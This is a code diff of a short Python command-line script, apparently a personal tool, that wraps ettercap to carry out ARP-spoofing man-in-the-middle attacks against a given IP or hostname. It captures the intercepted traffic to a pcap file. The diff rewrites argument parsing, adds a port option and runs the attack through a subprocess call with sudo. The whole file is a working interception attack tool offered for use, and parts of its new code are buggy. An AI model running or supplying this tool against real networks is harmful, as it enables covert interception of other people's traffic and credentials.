@@ -1,33 +1,38 @@
 #!/usr/local/bin/python
 
-# requires:
-#   ettercap ('brew install ettercap')
-#   shell ('pip install shell')
+# requires ettercap ('brew install ettercap')
 
 # usage:
 #   'mitm {ip}'
 # or
 #   'mitm -h {host}'
 
-import shell
+from __future__ import print_function
+
 import sys
 import socket
 from getopt import getopt
+from subprocess import Popen, PIPE, STDOUT
 
-if len(sys.argv) == 0:
-    print ("Usage: mitm [IP] or mitm -h [HOSTNAME]")
+if len(sys.argv) < 2:
+    print ("Usage: mitm [IP] \n\t -h [HOSTNAME] (replaces IP) \n\t -p [PORT]")
     exit(0)
 
-(options, addr) = getopt(sys.argv, "-h")
+(options, addr) = getopt(sys.argv[1:], "h:p:")
 
-print options
+try:
+    ip = socket.gethostbyname(options[0][1])
+except:
+    ip = addr[0]
 
-if options:
-    # lookup the hostname
-    ip = socket.gethostbyaddr(addr)[0]
-else:
-    ip = addr
+try:
+    port = options['p'][1]
+except:
+    port=''
 
-print ("MITM attacking {}. Stand by...".format(addr))
+print ("MITM attacking {}. Stand by...".format(ip))
+p = Popen('sudo ettercap -i en1 -T -w /Users/bjacobel/Desktop/ettercap.pcap -M ARP /{}/ /{}/ output:'.format(ip,port), stdout = PIPE, stderr = STDOUT, shell = True)
 
-shell('sudo ettercap -i en1 -T -w ~/Desktop/ettercap.pcap -M ARP /{}/ // output:'.format(ip))
+for line in iter(p.stdout.readline, ""):
+    line = p.stdout.readline()
+    print(line, end="")
